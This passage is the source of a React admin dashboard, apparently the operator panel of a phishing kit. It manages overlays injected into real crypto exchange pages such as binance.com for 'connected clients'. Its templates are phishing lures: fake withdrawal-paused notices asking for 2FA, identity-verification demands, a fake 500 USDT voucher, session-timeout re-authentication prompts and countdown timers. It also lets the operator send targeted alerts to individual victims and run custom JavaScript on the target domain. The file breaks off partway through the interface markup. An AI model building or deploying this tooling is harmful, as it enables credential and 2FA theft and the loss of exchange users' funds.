'use client';

import { useState, useEffect, useRef } from 'react';

export default function AdminDashboard() {
  const [activeTab, setActiveTab] = useState('rules'); // rules | preview | clients | messages | docs
  const [rules, setRules] = useState([]);
  const [clients, setClients] = useState([]);
  const [messages, setMessages] = useState([]);
  const [stats, setStats] = useState({ totalClients: 0, onlineClients: 0, totalRequests: 0, rulesCount: 0 });
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [toast, setToast] = useState(null);

  const hasInitializedRef = useRef(false);

  // Modal States
  const [showAddDomainModal, setShowAddDomainModal] = useState(false);
  const [newDomainInput, setNewDomainInput] = useState('');
  const [newDomainTemplate, setNewDomainTemplate] = useState('binance');

  const [showAlertModal, setShowAlertModal] = useState(false);
  const [alertTargetClient, setAlertTargetClient] = useState(null);
  const [alertForm, setAlertForm] = useState({
    title: 'Withdrawal Paused: Action Required',
    body: 'Your withdrawal of 1.45 BTC is temporarily paused. Please verify your 2FA identity credentials to authorize the transaction.',
    ctaText: 'Verify 2FA Now →',
    ctaUrl: 'https://accounts.binance.com',
    variant: 'danger', // warning | danger | success | info
    position: 'center', // center | top
  });

  // Default section template generator
  const createDefaultSection = (type) => {
    const id = 'sec_' + Math.random().toString(36).substring(2, 9);
    switch (type) {
      case 'heading':
        return { id, type: 'heading', text: 'Important Security Announcement', size: 32, color: '#f0b90b', align: 'center' };
      case 'text':
        return { id, type: 'text', text: 'Please complete your account verification to ensure uninterrupted trading access.', size: 16, color: '#eaecef', align: 'center' };
      case 'button':
        return { id, type: 'button', text: 'Verify Account Now →', url: 'https://binance.com', bg: '#f0b90b', color: '#000000', size: 15 };
      case 'alert':
        return { id, type: 'alert', text: 'Action required within 24 hours to prevent temporary withdrawal pause.', variant: 'warning', icon: '⚠️' };
      case 'countdown':
        return { id, type: 'countdown', label: 'Security Window Expires In:', minutes: 15 };
      case 'image':
        return { id, type: 'image', url: 'https://cryptologos.cc/logos/binance-coin-bnb-logo.svg', width: '120px' };
      default:
        return { id, type: 'text', text: 'New content block', size: 16, color: '#eaecef', align: 'center' };
    }
  };

  const initialForm = {
    id: null,
    domain: 'binance.com',
    enabled: true,
    overlay: {
      builderMode: 'elementor', // 'elementor' | 'code'
      sections: [
        { id: 'sec-1', type: 'alert', text: 'Urgent: Complete Identity Verification Refresh', variant: 'warning', icon: '⚠️' },
        { id: 'sec-2', type: 'heading', text: 'Verify Your Binance Account', size: 32, color: '#f0b90b', align: 'center' },
        { id: 'sec-3', type: 'text', text: 'Due to updated regulatory guidelines, please re-authenticate your credentials to unlock full trading limits.', size: 16, color: '#eaecef', align: 'center' },
        { id: 'sec-4', type: 'button', text: 'Verify Account Now →', url: 'https://binance.com/en/my/settings/profile', bg: '#f0b90b', color: '#000000', size: 15 },
        { id: 'sec-5', type: 'countdown', label: 'Verification Window Expires In:', minutes: 15 },
      ],
      position: 'center',
      height: '52',
      width: '540px',
      bg: '#14171d',
      text: '#eaecef',
      borderRadius: '16',
      borderWidth: '2',
      borderColor: '#f0b90b',
      shadow: 'strong',
      backdropBlur: true,
      closable: true,
      customHtml: '<div style="text-align: center; padding: 24px;">\n  <h2 style="color: #f0b90b; font-size: 28px; margin-bottom: 12px;">Security Verification Required</h2>\n  <p style="color: #eaecef; font-size: 16px; margin-bottom: 20px;">Please re-authenticate your wallet to continue uninterrupted withdrawals.</p>\n  <a href="#" style="background: #f0b90b; color: #000; padding: 12px 30px; font-weight: bold; text-decoration: none; border-radius: 8px; display: inline-block;">Verify Credentials Now</a>\n</div>',
      customCss: '',
      customJs: '// Remote JS script executed on target domain\nconsole.log("[RemoteOverlay] Active on domain:", window.location.hostname);',
    },
  };

  const [formData, setFormData] = useState(initialForm);
  const [selectedRuleId, setSelectedRuleId] = useState(null);
  const [deviceViewport, setDeviceViewport] = useState('desktop'); // desktop | mobile
  const [previewClosed, setPreviewClosed] = useState(false);
  const [showAddSectionTray, setShowAddSectionTray] = useState(false);
  const [codeActiveTab, setCodeActiveTab] = useState('html'); // html | css | js

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 3500);
  };

  const currentMode = formData.overlay?.builderMode || 'elementor';

  const currentSections = formData.overlay?.sections && Array.isArray(formData.overlay?.sections)
    ? formData.overlay.sections
    : [];

  const updateOverlay = (field, value) => {
    setFormData((prev) => ({
      ...prev,
      overlay: {
        ...(prev.overlay || {}),
        [field]: value,
      },
    }));
  };

  const setBuilderMode = (mode) => {
    updateOverlay('builderMode', mode);
  };

  // Section manipulation functions
  const handleAddSection = (type) => {
    const newSec = createDefaultSection(type);
    const updated = [...currentSections, newSec];
    updateOverlay('sections', updated);
    setShowAddSectionTray(false);
    showToast(`Added ${type.toUpperCase()} section`);
  };

  const handleUpdateSection = (index, field, value) => {
    const updated = [...currentSections];
    if (updated[index]) {
      updated[index] = { ...updated[index], [field]: value };
      updateOverlay('sections', updated);
    }
  };

  const handleRemoveSection = (index) => {
    const updated = currentSections.filter((_, i) => i !== index);
    updateOverlay('sections', updated);
    showToast('Section removed');
  };

  const handleMoveSection = (index, direction) => {
    const targetIdx = index + direction;
    if (targetIdx < 0 || targetIdx >= currentSections.length) return;
    const updated = [...currentSections];
    const temp = updated[index];
    updated[index] = updated[targetIdx];
    updated[targetIdx] = temp;
    updateOverlay('sections', updated);
  };

  // Fetch initial data
  const fetchData = async () => {
    try {
      setLoading(true);
      const res = await fetch('/api/admin/rules');
      const data = await res.json();

      if (data.success) {
        setRules(data.rules || []);
        setClients(data.clients || []);
        setMessages(data.messages || []);
        setStats(data.stats || {});

        if (!hasInitializedRef.current && data.rules && data.rules.length > 0) {
          hasInitializedRef.current = true;
          handleSelectRule(data.rules[0]);
        }
      }
    } catch (err) {
      showToast('Failed to load rules and clients', 'error');
    } finally {
      setLoading(false);
    }
  };

  const fetchClientsAndStats = async () => {
    try {
      const res = await fetch('/api/admin/clients');
      const data = await res.json();
      if (data.success) {
        setClients(data.clients || []);
        setStats((prev) => ({
          ...prev,
          onlineClients: data.onlineClients || 0,
          totalClients: data.totalClients || 0,
        }));
      }

      const msgRes = await fetch('/api/admin/messages');
      const msgData = await msgRes.json();
      if (msgData.success) {
        setMessages(msgData.messages || []);
      }
    } catch (e) {}
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchClientsAndStats, 8000);
    return () => clearInterval(interval);
  }, []);

  // When a rule is selected from sidebar/chips
  const handleSelectRule = (rule) => {
    setSelectedRuleId(rule.id);
    setPreviewClosed(false);

    let ruleSections = rule.overlay?.sections;
    if (!ruleSections || !Array.isArray(ruleSections) || ruleSections.length === 0) {
      ruleSections = [];
      if (rule.overlay?.title) {
        ruleSections.push({
          id: 'sec-t',
          type: 'heading',
          text: rule.overlay.title,
          size: parseInt(rule.overlay.titleSize, 10) || 32,
          color: rule.overlay.titleColor || '#f0b90b',
          align: rule.overlay.textAlign || 'center',
        });
      }
      if (rule.overlay?.message) {
        ruleSections.push({
          id: 'sec-m',
          type: 'text',
          text: rule.overlay.message,
          size: parseInt(rule.overlay.messageSize, 10) || 16,
          color: rule.overlay.text || '#eaecef',
          align: rule.overlay.textAlign || 'center',
        });
      }
      if (rule.overlay?.ctaText) {
        ruleSections.push({
          id: 'sec-b',
          type: 'button',
          text: rule.overlay.ctaText,
          url: rule.overlay.ctaUrl || '',
          bg: rule.overlay.ctaBg || '#f0b90b',
          color: rule.overlay.ctaColor || '#000000',
          size: 15,
        });
      }
      if (ruleSections.length === 0) {
        ruleSections = [
          { id: 'sec-1', type: 'heading', text: 'Important Notice', size: 30, color: '#f0b90b', align: 'center' },
          { id: 'sec-2', type: 'text', text: 'Message content goes here...', size: 16, color: '#eaecef', align: 'center' },
        ];
      }
    }

    setFormData({
      id: rule.id,
      domain: rule.domain,
      enabled: rule.enabled !== false,
      overlay: {
        builderMode: rule.overlay?.builderMode || 'elementor',
        sections: ruleSections,
        position: rule.overlay?.position || 'top',
        height: String(rule.overlay?.height || '45'),
        width: rule.overlay?.width || '540px',
        bg: rule.overlay?.bg || '#14171d',
        text: rule.overlay?.text || '#eaecef',
        borderRadius: String(rule.overlay?.borderRadius ?? '12'),
        borderWidth: String(rule.overlay?.borderWidth ?? '2'),
        borderColor: rule.overlay?.borderColor || '#f0b90b',
        shadow: rule.overlay?.shadow || 'strong',
        backdropBlur: !!rule.overlay?.backdropBlur,
        closable: rule.overlay?.closable !== false,
        customHtml: rule.overlay?.customHtml || '<div style="text-align: center; padding: 20px;"><h2 style="color: #f0b90b;">Custom HTML Banner</h2><p>Custom HTML markup...</p></div>',
        customCss: rule.overlay?.customCss || '',
        customJs: rule.overlay?.customJs || '',
        title: rule.overlay?.title || '',
        message: rule.overlay?.message || '',
        ctaText: rule.overlay?.ctaText || '',
      },
    });
  };

  // Dedicated clean modal: Create New Domain Rule
  const handleOpenAddDomainModal = () => {
    setNewDomainInput('');
    setNewDomainTemplate('binance');
    setShowAddDomainModal(true);
  };

  const handleCreateNewDomainRule = async (e) => {
    e?.preventDefault();
    const domainClean = newDomainInput.trim().toLowerCase();
    if (!domainClean) {
      showToast('Please enter a target domain (e.g. bybit.com)', 'error');
      return;
    }

    // Prepare template sections
    let templateSections = [];
    let templateBorder = '#f0b90b';
    let templatePos = 'center';

    if (newDomainTemplate === 'binance') {
      templateSections = [
        { id: 's1', type: 'alert', text: 'Action Required: Verify Account to Continue', variant: 'warning', icon: '⚠️' },
        { id: 's2', type: 'heading', text: 'Verify Your Binance Account', size: 30, color: '#f0b90b', align: 'center' },
        { id: 's3', type: 'text', text: 'Please complete your 2FA verification to unlock full deposit and withdrawal privileges.', size: 16, color: '#eaecef', align: 'center' },
        { id: 's4', type: 'button', text: 'Verify Account Now →', url: 'https://binance.com', bg: '#f0b90b', color: '#000000', size: 15 },
      ];
      templateBorder = '#f0b90b';
      templatePos = 'center';
    } else if (newDomainTemplate === 'withdrawal') {
      templateSections = [
        { id: 's1', type: 'alert', text: 'Security Notice: Withdrawal Temporarily Paused', variant: 'danger', icon: '🚨' },
        { id: 's2', type: 'heading', text: 'Withdrawal Paused', size: 32, color: '#ef4444', align: 'center' },
        { id: 's3', type: 'text', text: 'Withdrawals are paused for 24 hours due to an unrecognized login. Re-authenticate to resume.', size: 16, color: '#eaecef', align: 'center' },
        { id: 's4', type: 'button', text: 'Authenticate Identity Now', url: '#verify', bg: '#ef4444', color: '#ffffff', size: 15 },
      ];
      templateBorder = '#ef4444';
      templatePos = 'center';
    } else if (newDomainTemplate === 'bonus') {
      templateSections = [
        { id: 's1', type: 'heading', text: '🎁 500 USDT Voucher Credited!', size: 28, color: '#10b981', align: 'center' },
        { id: 's2', type: 'text', text: 'Your futures trading rebate reward is unlocked. Claim before expiration.', size: 15, color: '#eaecef', align: 'center' },
        { id: 's3', type: 'button', text: 'Claim Voucher Now', url: '#claim', bg: '#10b981', color: '#000000', size: 14 },
      ];
      templateBorder = '#10b981';
      templatePos = 'bottom-right';
    } else {
      templateSections = [
        { id: 's1', type: 'heading', text: 'Announcement Title', size: 28, color: '#f0b90b', align: 'center' },
        { id: 's2', type: 'text', text: 'Enter your custom message here...', size: 16, color: '#eaecef', align: 'center' },
      ];
    }

    const newRulePayload = {
      domain: domainClean,
      enabled: true,
      overlay: {
        builderMode: 'elementor',
        sections: templateSections,
        position: templatePos,
        height: '48',
        width: '540px',
        bg: '#14171d',
        text: '#eaecef',
        borderRadius: '16',
        borderWidth: '2',
        borderColor: templateBorder,
        shadow: 'strong',
        backdropBlur: true,
        closable: true,
        customHtml: '',
        customCss: '',
        customJs: '',
      },
    };

    try {
      setSaving(true);
      const res = await fetch('/api/admin/rules', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(newRulePayload),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error || 'Failed to create rule');

      showToast(`Rule for "${domainClean}" created successfully!`);
      setShowAddDomainModal(false);

      if (result.rule) {
        setRules((prev) => [result.rule, ...prev.filter((r) => r.id !== result.rule.id)]);
        handleSelectRule(result.rule);
      }
    } catch (err) {
      showToast(err.message || 'Failed to create rule', 'error');
    } finally {
      setSaving(false);
    }
  };

  // Save current rule
  const handleSaveRule = async (e) => {
    e?.preventDefault();
    try {
      setSaving(true);
      const isNew = !formData.id;
      const url = '/api/admin/rules';
      const method = isNew ? 'POST' : 'PUT';

      const res = await fetch(url, {
        method,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error || 'Failed to save rule');

      showToast(`Rule for "${formData.domain}" saved & published!`);

      if (result.rule) {
        const savedRule = result.rule;
        setSelectedRuleId(savedRule.id);
        setFormData((prev) => ({
          ...prev,
          id: savedRule.id,
          domain: savedRule.domain,
          enabled: savedRule.enabled,
          overlay: {
            ...(prev.overlay || {}),
            ...(savedRule.overlay || {}),
          },
        }));

        if (isNew) {
          setRules((prev) => [savedRule, ...prev.filter((r) => r.id !== savedRule.id)]);
        } else {
          setRules((prev) => prev.map((r) => (r.id === savedRule.id ? savedRule : r)));
        }
      }
    } catch (err) {
      showToast(err.message || 'Failed to save rule', 'error');
    } finally {
      setSaving(false);
    }
  };

  // Delete rule
  const handleDeleteRule = async (ruleId) => {
    if (!confirm('Are you sure you want to delete this rule?')) return;
    try {
      const res = await fetch(`/api/admin/rules?id=${encodeURIComponent(ruleId)}`, {
        method: 'DELETE',
      });
      const result = await res.json();
      if (!result.success) throw new Error(result.error || 'Failed to delete rule');

      showToast('Rule deleted successfully');
      setRules((prev) => {
        const remaining = prev.filter((r) => r.id !== ruleId);
        if (selectedRuleId === ruleId) {
          if (remaining.length > 0) {
            handleSelectRule(remaining[0]);
          } else {
            handleOpenAddDomainModal();
          }
        }
        return remaining;
      });
    } catch (err) {
      showToast(err.message || 'Failed to delete rule', 'error');
    }
  };

  // Open Direct Alert Modal for a specific connected client
  const handleOpenAlertModalForClient = (client) => {
    setAlertTargetClient(client);
    setAlertForm({
      title: 'Withdrawal Paused: Action Required',
      body: `Your account activity on ${client?.domain || 'this platform'} requires 2FA confirmation to unlock full services.`,
      ctaText: 'Verify 2FA Now →',
      ctaUrl: 'https://accounts.binance.com',
      variant: 'danger',
      position: 'center',
    });
    setShowAlertModal(true);
  };

  // Apply Alert Template in the modal
  const handleApplyAlertTemplate = (presetType) => {
    if (presetType === 'withdrawal') {
      setAlertForm({
        title: 'Withdrawal Paused: Action Required',
        body: 'Withdrawal of 1.45 BTC has been paused due to unrecognized IP login. Verify 2FA to authorize.',
        ctaText: 'Verify 2FA Now →',
        ctaUrl: 'https://accounts.binance.com',
        variant: 'danger',
        position: 'center',
      });
    } else if (presetType === 'verification') {
      setAlertForm({
        title: 'Identity Verification Notice',
        body: 'Due to updated regional regulatory requirements, please complete your facial verification refresh.',
        ctaText: 'Start Verification →',
        ctaUrl: 'https://binance.com/en/my/settings/profile',
        variant: 'warning',
        position: 'center',
      });
    } else if (presetType === 'reward') {
      setAlertForm({
        title: '🎉 500 USDT Voucher Added!',
        body: 'You have been awarded a VIP trading rebate voucher. Claim within 24 hours before expiration.',
        ctaText: 'Claim Reward Voucher',
        ctaUrl: 'https://binance.com/en/activity/rewards',
        variant: 'success',
        position: 'center',
      });
    } else if (presetType === 'session') {
      setAlertForm({
        title: 'Security Session Timeout',
        body: 'Your active session is expiring in 5 minutes. Please re-authenticate to remain logged in.',
        ctaText: 'Extend Session Now',
        ctaUrl: 'https://accounts.binance.com',
        variant: 'info',
        position: 'top',
      });
    }
  };

  // Send Direct Alert to Connected Client
  const handleSendDirectAlert = async (e) => {
    e?.preventDefault();
    if (!alertForm.title || !alertForm.body) {
      showToast('Please enter alert title and message', 'error');
      return;
    }

    const variantColorMap = {
      warning: '#f0b90b',
      danger: '#ef4444',
      success: '#10b981',
      info: '#3b82f6',
    };

    const chosenColor = variantColorMap[alertForm.variant] || '#f0b90b';

    const payload = {
      targetClientId: alertTargetClient ? alertTargetClient.clientId : null,
      title: alertForm.title,
      body: alertForm.body,
      colorTitle: chosenColor,
      borderColor: chosenColor,
      colorBg: '#14171d',
      colorText: '#eaecef',
      ctaText: alertForm.ctaText,
      ctaUrl: alertForm.ctaUrl,
      ctaBg: chosenColor,
      ctaColor: alertForm.variant === 'warning' || alertForm.variant === 'success' ? '#000000' : '#ffffff',
      position: alertForm.position,
      height: '45',
      width: '520px',
    };

    try {
      const res = await fetch('/api/admin/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const result = await res.json();
      if (!result.success) throw new Error(result.error);

      showToast(alertTargetClient ? `Alert sent directly to ${alertTargetClient.clientId}!` : 'Broadcast alert dispatched to all clients!');
      setShowAlertModal(false);
      fetchClientsAndStats();
    } catch (err) {
      showToast(err.message || 'Failed to dispatch alert', 'error');
    }
  };

  // Delete/Cancel an active alert
  const handleDeleteAlertMessage = async (id) => {
    try {
      const res = await fetch(`/api/admin/messages?id=${id}`, { method: 'DELETE' });
      const result = await res.json();
      if (result.success) {
        showToast('Alert cancelled & removed from client screen');
        fetchClientsAndStats();
      }
    } catch (err) {
      showToast('Failed to cancel alert', 'error');
    }
  };

  // Live Canvas Preview Renderer
  const renderLiveCanvas = (isFullTab = false) => {
    const pos = formData.overlay?.position || 'top';
    const heightVal = `${formData.overlay?.height || 50}vh`;

    const borderVal = `${formData.overlay?.borderWidth || 2}px solid ${formData.overlay?.borderColor || '#f0b90b'}`;

    // Compute separate border values to avoid shorthand/non-shorthand conflicts in React
    const borderTopVal = pos === 'top' ? 'none' : borderVal;
    const borderBottomVal = pos === 'bottom' ? 'none' : borderVal;
    const borderLeftVal = (pos === 'top' || pos === 'bottom') ? 'none' : borderVal;
    const borderRightVal = (pos === 'top' || pos === 'bottom') ? 'none' : borderVal;

    let overlayStyle = {
      backgroundColor: formData.overlay?.bg || '#14171d',
      color: formData.overlay?.text || '#eaecef',
      fontFamily: 'Arial, sans-serif',
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      borderRadius: `${formData.overlay?.borderRadius || 0}px`,
      borderTop: borderTopVal,
      borderBottom: borderBottomVal,
      borderLeft: borderLeftVal,
      borderRight: borderRightVal,
      boxSizing: 'border-box',
      padding: '28px 36px',
      zIndex: 100,
      transition: 'all 0.25s ease',
    };

    if (formData.overlay?.shadow === 'none') {
      overlayStyle.boxShadow = 'none';
    } else if (formData.overlay?.shadow === 'glow') {
      overlayStyle.boxShadow = `0 0 35px ${formData.overlay?.borderColor || '#f0b90b'}55, 0 10px 40px rgba(0,0,0,0.8)`;
    } else {
      overlayStyle.boxShadow = '0 12px 50px rgba(0,0,0,0.7)';
    }

    if (pos === 'top') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        top: 0,
        left: 0,
        width: '100%',
        height: heightVal,
        maxHeight: '92%',
      });
    } else if (pos === 'bottom') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        bottom: 0,
        left: 0,
        width: '100%',
        height: heightVal,
        maxHeight: '92%',
      });
    } else if (pos === 'center') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        top: '50%',
        left: '50%',
        transform: 'translate(-50%, -50%)',
        width: formData.overlay?.width || '540px',
        maxWidth: '92%',
        minHeight: '220px',
        height: 'auto',
        maxHeight: '85%',
        borderRadius: `${formData.overlay?.borderRadius || 16}px`,
      });
    } else if (pos === 'bottom-right') {
      Object.assign(overlayStyle, {
        position: 'absolute',
        bottom: '20px',
        right: '20px',
        width: formData.overlay?.width || '400px',
        maxWidth: '90%',
        height: 'auto',
        borderRadius: `${formData.overlay?.borderRadius || 12}px`,
      });
    }

    return (
      <div className="preview-browser">
        {/* Top Browser Chrome Bar */}
        <div className="browser-topbar">
          <div className="browser-dots">
            <div className="browser-dot red"></div>
            <div className="browser-dot yellow"></div>
            <div className="browser-dot green"></div>
          </div>

          <div className="browser-url-bar">
            <span style={{ color: '#10b981' }}>🔒 https://</span>
            <span>{formData.domain.replace('*', 'www')}/en/trade/BTC_USDT</span>
          </div>

          {/* Device Viewport Selector */}
          <div style={{ display: 'flex', gap: '4px' }}>
            <button
              type="button"
              className={`btn btn-sm ${deviceViewport === 'desktop' ? 'btn-primary' : 'btn-secondary'}`}
              onClick={() => setDeviceViewport('desktop')}
            >
              🖥 Desktop
            </button>
            <button
              type="button"
              className={`btn btn-sm ${deviceViewport === 'mobile' ? 'btn-primary' : 'btn-secondary'}`}
              onClick={() => setDeviceViewport('mobile')}
            >
              📱 Mobile
            </button>
          </div>
        </div>

        {/* Live Preview Viewport Stage */}
        <div
          className="preview-stage"
          style={{
            alignItems: 'center',
            justifyContent: 'center',
            minHeight: isFullTab ? '640px' : '520px',
          }}
        >
          <div
            style={{
              width: deviceViewport === 'mobile' ? '390px' : '100%',
              height: '100%',
              minHeight: isFullTab ? '640px' : '520px',
              position: 'relative',
              overflow: 'hidden',
              transition: 'width 0.25s ease',
              borderLeft: deviceViewport === 'mobile' ? '2px solid rgba(255,255,255,0.1)' : 'none',
              borderRight: deviceViewport === 'mobile' ? '2px solid rgba(255,255,255,0.1)' : 'none',
              backgroundColor: '#0b0e11',
            }}
          >
            {/* Backdrop Blur (Center modal) */}
            {pos === 'center' && !previewClosed && formData.enabled && (
              <div
                style={{
                  position: 'absolute',
                  inset: 0,
                  backgroundColor: 'rgba(0, 0, 0, 0.65)',
                  backdropFilter: formData.overlay?.backdropBlur ? 'blur(6px)' : 'none',
                  zIndex: 90,
                  transition: 'all 0.3s ease',
                }}
                onClick={() => setPreviewClosed(true)}
              />
            )}

            {/* Simulated Overlay Popup */}
            {formData.enabled && !previewClosed ? (
              <div id="preview-custom-popup" style={overlayStyle}>
                {/* Close Button */}
                {formData.overlay?.closable !== false && (
                  <div
                    onClick={() => setPreviewClosed(true)}
                    style={{
                      position: 'absolute',
                      top: '14px',
                      right: '18px',
                      cursor: 'pointer',
                      fontSize: '18px',
                      color: formData.overlay?.text || '#eaecef',
                      opacity: 0.7,
                      lineHeight: 1,
                      zIndex: 110,
                    }}
                    title="Simulate Close"
                  >
                    ✕
                  </div>
                )}

                {/* Content Renderer: Custom Coding vs Elementor Sections */}
                {currentMode === 'code' ? (
                  formData.overlay?.customHtml ? (
                    <div
                      style={{ width: '100%' }}
                      dangerouslySetInnerHTML={{ __html: formData.overlay.customHtml }}
                    />
                  ) : (
                    <div style={{ textAlign: 'center', padding: '20px', color: '#848e9c' }}>
                      <p style={{ fontWeight: 600 }}>Custom HTML is empty</p>
                      <p style={{ fontSize: '12px' }}>Type your markup in the Custom Coding tab on the left.</p>
                    </div>
                  )
                ) : (
                  /* Elementor Sections Mode */
                  <div style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                    {currentSections.map((sec, idx) => (
                      <div key={sec.id || idx} style={{ width: '100%', marginBottom: '10px' }}>
                        {sec.type === 'heading' && (
                          <div
                            style={{
                              fontSize: `${sec.size || 30}px`,
                              fontWeight: 'bold',
                              color: sec.color || '#f0b90b',
                              textAlign: sec.align || 'center',
                              lineHeight: 1.25,
                            }}
                          >
                            {sec.text}
                          </div>
                        )}

                        {sec.type === 'text' && (
                          <div
                            style={{
                              fontSize: `${sec.size || 16}px`,
                              lineHeight: 1.6,
                              color: sec.color || '#eaecef',
                              textAlign: sec.align || 'center',
                            }}
                            dangerouslySetInnerHTML={{ __html: sec.text }}
                          />
                        )}

                        {sec.type === 'button' && (
                          <div style={{ textAlign: 'center', marginTop: '6px' }}>
                            <a
                              href={sec.url || '#'}
                              target="_blank"
                              rel="noreferrer"
                              style={{
                                display: 'inline-block',
                                padding: '10px 28px',
                                background: sec.bg || '#f0b90b',
                                color: sec.color || '#000000',
                                fontWeight: 700,
                                fontSize: `${sec.size || 15}px`,
                                borderRadius: '8px',
                                textDecoration: 'none',
                                boxShadow: '0 4px 15px rgba(0,0,0,0.25)',
                              }}
                            >
                              {sec.text}
                            </a>
                          </div>
                        )}

                        {sec.type === 'alert' && (
                          <div
                            style={{
                              padding: '8px 16px',
                              borderRadius: '6px',
                              background: sec.variant === 'danger' ? 'rgba(239, 68, 68, 0.15)' : 'rgba(245, 158, 11, 0.15)',
                              border: `1px solid ${sec.variant === 'danger' ? '#ef4444' : '#f59e0b'}`,
                              color: sec.variant === 'danger' ? '#ef4444' : '#f59e0b',
                              fontSize: '13px',
                              fontWeight: 600,
                              textAlign: 'center',
                              display: 'flex',
                              alignItems: 'center',
                              justifyContent: 'center',
                              gap: '8px',
                            }}
                          >
                            <span>{sec.icon || '⚠️'}</span>
                            <span>{sec.text}</span>
                          </div>
                        )}

                        {sec.type === 'countdown' && (
                          <div
                            style={{
                              textAlign: 'center',
                              fontFamily: 'monospace',
                              fontSize: '15px',
                              color: '#f59e0b',
                              fontWeight: 700,
                              margin: '6px 0',
                            }}
                          >
                            ⏳ {sec.label || 'Expires in:'} {String(sec.minutes || 10).padStart(2, '0')}:00
                          </div>
                        )}

                        {sec.type === 'image' && (
                          <div style={{ textAlign: 'center' }}>
                            <img src={sec.url} alt="Section media" style={{ maxWidth: sec.width || '140px' }} />
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ) : (
              <div
                style={{
                  position: 'absolute',
                  top: '20px',
                  left: '50%',
                  transform: 'translateX(-50%)',
                  background: 'rgba(239, 68, 68, 0.15)',
                  border: '1px solid var(--brand-red)',
                  color: 'var(--brand-red)',
                  padding: '8px 18px',
                  borderRadius: '8px',
                  fontSize: '12px',
                  fontWeight: 600,
                }}
              >
                {!formData.enabled ? 'Overlay is currently DISABLED' : 'Overlay was closed in simulation. Click below to reopen:'}
                {previewClosed && (
                  <button
                    type="button"
                    className="btn btn-sm btn-secondary"
                    style={{ marginLeft: '10px' }}
                    onClick={() => setPreviewClosed(false)}
                  >
                    Reopen Popup
                  </button>
                )}
              </div>
            )}

            {/* Background Simulated Binance Content */}
            <div className="mock-page-content">
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '25px' }}>
                <div style={{ width: '130px', height: '26px', background: '#f0b90b', borderRadius: '4px' }}></div>
                <div style={{ display: 'flex', gap: '16px' }}>
                  <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                  <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                  <div style={{ width: '60px', height: '20px', background: '#2b313a', borderRadius: '4px' }}></div>
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '24px' }}>
                {[1, 2, 3, 4].map((i) => (
                  <div key={i} style={{ height: '80px', background: '#181a20', borderRadius: '8px' }}></div>
                ))}
              </div>

              <div style={{ height: '200px', background: '#181a20', borderRadius: '8px' }}></div>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="app-container">
      {/* Toast Notification */}
      {toast && (
        <div className={`toast toast-${toast.type}`}>
          <span>{toast.type === 'success' ? '✓' : '⚠'}</span>
          <span>{toast.message}</span>
        </div>
      )}

      {/* Top Header */}
      <header className="header-bar">
        <div className="brand-wrapper">
          <div className="brand-icon">⚡</div>
          <div>
            <h1 className="brand-title">Remote Dynamic Overlay Studio</h1>
            <p className="brand-subtitle">Visual Elementor builder & targeted direct client alert injector</p>
          </div>
        </div>

        <div className="header-stats">
          <div className="stat-pill">
            <span className="dot-indicator dot-green"></span>
            <span>API: <strong>Online</strong></span>
          </div>
          <div className="stat-pill">
            <span className={`dot-indicator ${stats.mongoConnected ? 'dot-green' : 'dot-gold'}`}></span>
            <span>Database: <strong>{stats.mongoConnected ? 'MongoDB Live' : 'Local Fallback'}</strong></span>
          </div>
          <div className="stat-pill">
            <span>Rules: <strong>{rules.length}</strong></span>
          </div>
          <div className="stat-pill">
            <span className="dot-indicator dot-green"></span>
            <span>Online Clients: <strong>{stats.onlineClients || 0}</strong></span>
          </div>
        </div>
      </header>

      {/* Navigation Tabs */}
      <nav className="tabs-nav">
        <button
          className={`tab-btn ${activeTab === 'rules' ? 'active' : ''}`}
          onClick={() => setActiveTab('rules')}
        >
          <span>🎨 Visual Editor</span>
          <span className="tab-count">{rules.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'preview' ? 'active' : ''}`}
          onClick={() => setActiveTab('preview')}
        >
          <span>👁 Fullscreen Preview</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'clients' ? 'active' : ''}`}
          onClick={() => setActiveTab('clients')}
        >
          <span>👥 Connected Clients & Instant Alert</span>
          <span className="tab-count">{clients.length}</span>
        </button>

        <button
          className={`tab-btn ${activeTab === 'docs' ? 'active' : ''}`}
          onClick={() => setActiveTab('docs')}
        >
          <span>📖 Setup Guide</span>
        </button>
      </nav>

      {/* TAB 1: Visual Editor & Live Preview */}
      {activeTab === 'rules' && (
        <div>
          {/* Domain Rules Selector Bar */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              background: 'var(--bg-card)',
              border: '1px solid var(--border-subtle)',
              borderRadius: 'var(--radius-md)',
              padding: '12px 18px',
              marginBottom: '18px',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
              <span style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-secondary)' }}>Target Domain:</span>
              {rules.map((rule) => {
                const isSelected = selectedRuleId === rule.id;
                return (
                  <button
                    key={rule.id}
                    type="button"
                    onClick={() => handleSelectRule(rule)}
                    style={{
                      padding: '6px 14px',
                      borderRadius: '8px',
                      fontSize: '12px',
                      fontWeight: 600,
                      cursor: 'pointer',
                      background: isSelected ? 'var(--brand-purple-subtle)' : '#ffffff',
                      border: `1px solid ${isSelected ? 'var(--brand-purple)' : 'var(--border-light)'}`,
